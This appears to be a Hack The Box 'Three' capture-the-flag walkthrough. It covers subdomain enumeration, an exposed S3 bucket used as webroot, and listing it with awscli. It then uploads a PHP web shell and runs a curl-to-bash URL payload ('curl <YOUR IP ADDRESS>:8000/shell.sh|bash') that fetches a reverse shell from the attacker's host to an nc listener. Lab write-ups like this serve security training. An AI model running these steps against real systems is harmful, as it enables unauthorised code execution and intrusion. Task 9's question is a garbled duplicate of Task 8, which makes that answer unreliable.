<h1>Three</h1>

<h2>CONNECT</h2>
Connect to Starting Point VPN before starting the machine<br>
Using <code>openvpn</code> to operate the file of <code>download vpn</code> in kali.

<h2>TASK</h2>

<h3>TASK 1</h3>
Q：How many TCP ports are open?<br>
A：<code>2</code><br><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/nmap.png" alt="nmap" width="60%">

<h3>TASK 2</h3>
Q：What is the domain of the email address provided in the "Contact" section of the website?<br>
A：<code>thetoppers.htb</code><br><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/contact.png" alt="-contact" width="60%">

<h3>TASK 3</h3>
Q：In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?<br>
A：<code>/etc/hosts</code><br>

<h3>TASK 4</h3>
Q：Which sub-domain is discovered during further enumeration?<br>
A：<code>s3.thetoppers.htb</code><br><br>
There are different enumeration tools available like <code>gobuster</code>, <code>wfuzz</code> , <code>feroxbuster</code> etc.<br>
Here I use gobuster for sub-domain enumeration by using the following command.<br>
If you do not have wordlist of subdomain, you can <a href="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Three/subdomain.txt">download</a> here.
<pre text="class">
<b>Command</b>:
gobuster vhost -w /usr/share/wordlists/subdonain.txt -u http://thetoppers.htb --append-domain<br>
<b>Parameter Description</b>:
vhost：Uses VHOST enumeration mode 
-u (--url string)：The target URL
-w (--wordlist string)：Path to the wordlist
<b>Note</b>:
If using Gobuster version <code>3.2.0 and above</code> we also have to add the <code>--append-domain</code> flag to our
command so that the enumeration takes into account the known vHost ( thetoppers.htb ) and appends it
to the words found in the wordlist ( word.thetoppers.htb ).
</pre>

<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/gobuster.png" alt="gobuster" width="60%">
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/vhost2.png" alt="vhost2" width="60%">

<h3>TASK 5</h3>
Q：Which service is running on the discovered sub-domain?<br>
A：<code>amazon s3</code><br><br>

<h3>TASK 6</h3>
Q：Which command line utility can be used to interact with the service running on the discovered sub-domain?<br>
A：<code>awscli</code><br><br>
<pre text="class">
<b>Install awscli on Linux</b>:
    apt-get update
    apt-get install awscli
</pre>

<h3>TASK 7</h3>
Q：Which command is used to set up the AWS CLI installation?<br>
A：<code>aws configure</code><br><br>
FYI：Abourt <a href="https://docs.aws.amazon.com/cli/latest/reference/configure/">aws configure</a>

<h3>TASK 8</h3>
Q：What is the command used by the above utility to list all of the S3 buckets?<br>
A：<code>aws s3 ls</code><br><br>
list all of the S3 buckets hosted by the server by using the following command.<br>
<code>aws --endpoint=http://s3.thetoppers.htb s3 ls</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/awsls.png" alt="awsls" width="60%">
FYI：About <a href="https://www.tecmint.com/tldr-easy-to-understand-linux-man-pages/">TLDR</a> command<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/tldr.png" alt="tldr" width="60%">

<h3>TASK 9</h3>
Q：What is the command used by the above utility to list all of the S3 buckets?<br>
A：<code>php</code><br><br>

<h2>SUBMIT FLAG</h2>
Let's visit <code>http://s3.thetoppers.htb</code> by using a browser and you will find that the website only contain the JSON as shown below.
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/s3thetoppers.png" alt="s3thetoppers" width="60%">
Remember to enter the corresponding <code>ip</code> and <code>domain</code> name in <code>/etc/hosts</code>,<br> otherwise the web page will display an error.
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/etc_hosts.png" alt="etc_hosts" width="60%">
Listing all user owned buckets with the command <code>aws --endpoint=http://s3.thetoppers.htb s3 ls</code>.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/awsls.png" alt="awsls" width="60%">
Listing all prefixes and objects in a bucket with the command <code>aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb</code>.<br><br>
We can see the files <code>index.php</code> , <code>.htaccess</code> and a directory called <code>images</code> in the specified bucket.<br>
It seems like that is the webroot of the website running on port 80.<br>
So the Apache server is using this S3 bucket as storage.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/awsls2.png" alt="awsls2" width="60%">

We already know that the website is using PHP.<br>
Thus, we can try uploading a <code>PHP shell</code> file to the S3 bucket and since it's uploaded to
the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we
will achieve <code>remote code execution</code>.<br>

Using the following <code>PHP one-liner</code> which uses the <code>system()</code> function which takes the URL parameter
<code>cmd</code> as an input and <code>executes</code> it as a system command.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/shell.php.png" alt="shell.php" width="60%"><br>

<code>awscli</code> has got another feature that allows us to <code>copy files</code> to a remote bucket.<br>
command：<code>aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/cp_shell.png" alt="cp_shell" width="60%"><br>
We can confirm that our shell is uploaded by navigating to <code>http://thetoppers.htb/shell.php</code>.<br>

Check if <code>shell.php</code> is uploaded successfully<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/awsls3.png" alt="awsls3" width="60%"><br>

Try to execute the OS command <code>id</code> by using the URL parameter <code>cmd</code>.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/cmd%3Did.png" alt="cmdid" width="60%"><br>
The response from the server contains the output of the OS command <code>id</code>,<br>
which verified that we have <code>code execution</code> on the box.<br><br>
Thus, let us now try to obtain a reverse shell.<br>

Through a reverse shell, we will trigger the remote host to connect back to our <code>local machine's IP</code> address on the specified listening port.<br>
Obtain the <code>tun0 IP</code> address of our local machine by using <code>ifconfig</code>.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/ifocnfig.png" alt="ifocnfig" width="60%"><br>

Create a new file <code>shell.sh</code> which containing the following bash reverse shell payload.<br>
Reverse shell will connect back to our local machine on port 1337.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/shell.sh.png" alt="shell.sh" width="40%">

Start a <code>nc</code> listener on our local port 1337 with the command <code>nc -nvlp 1337</code>.<br>
Start a <code>web server</code> on our local machine on port 8000 and host bash file with the command <code>python3 -m http.server 8000</code>.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/http_server.png" alt="http_server" width="60%">

Use the <code>curl</code> to fetch the bash reverse shell file from our local host,<br>
and then pipe it to bash in order to execute it.<br>
Thus, let us visit the following URL containing the payload in the browser.<br>
<code>http://thetoppers.htb/shell.php?cmd=curl%20<YOUR IP ADDRESS>:8000/shell.sh|bash</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/curl.png" alt="curl" width="60%">

We receive a reverse shell on the corresponding listening port.<br>
Try to enter <code>id</code> first to see whether the response from the server contains the output of the OS command id.<br>
The result does return information about the <code>id</code>.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/nc1.png" alt="nc1" width="60%"><br><br>
You will get the flag after trying to use <code>cd</code> or <code>ls</code> command！<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%201/Three/Three/nc2.png" alt="nc2" width="40%">

